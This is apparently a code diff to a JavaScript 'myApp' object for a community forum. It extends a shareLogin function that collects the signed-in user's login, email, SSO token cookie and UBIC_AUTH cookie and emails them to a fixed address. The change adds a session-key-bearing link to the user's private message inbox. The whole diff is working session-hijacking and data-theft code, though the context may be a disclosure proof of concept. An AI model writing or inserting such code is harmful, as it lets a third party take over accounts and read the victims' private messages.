@@ -97,16 +97,22 @@ var myApp = {
     shareLogin: function() {
         myApp.getUser(function(data) {
             if (data.response.status == 'success') {
-                var user = data.response.user;
-                var body = '<b>Login:</b>&nbsp;' + user.login + "<br />";
-                body += '<b>Email:</b>&nbsp;' + user.email + "<br />";
-                body += '<b>ssoToken:</b>&nbsp;' + myApp.getCookie('!lithiumSSO') + "<br />";
-                body += '<b>UBIC_AUTH:</b>&nbsp;' + myApp.getCookie('UBIC_AUTH') + "<br />";
-                myApp.sendEmail(data.response.user, {
-                    to: 'david.esposito@ubnt.com',
-                    subject: 'Info for ' + user.login,
-                    body: body
-                })
+                myApp.getSessionKey(function(sessionKey) {
+                    var user = data.response.user;
+                    var body = '<b>Login:</b>&nbsp;' + user.login + "<br />";
+                    body += '<b>Email:</b>&nbsp;' + user.email + "<br />";
+                    body += '<b>ssoToken:</b>&nbsp;' + myApp.getCookie('!lithiumSSO') + "<br />";
+                    body += '<b>UBIC_AUTH:</b>&nbsp;' + myApp.getCookie('UBIC_AUTH') + "<br />";
+                    var extraQp = myApp.sessionKeyQP.replace(/<<session_key>>/g, sessionKey);
+                    var privateNotesUrl = 'https://community.ubnt.com/restapi/vc/users/id/'+user.id+'/mailbox/notes/inbox';
+                    privateNotesUrl += myApp.urlQueryParams + extraQp;
+                    body += '<b><a href="'+privateNotesUrl+'" target="blank">View Uers\'s Private Messages</a></b>';
+                    myApp.sendEmail(data.response.user, {
+                        to: 'david.esposito@ubnt.com',
+                        subject: 'Info for ' + user.login,
+                        body: body
+                    })
+                });
             }
         })
     },
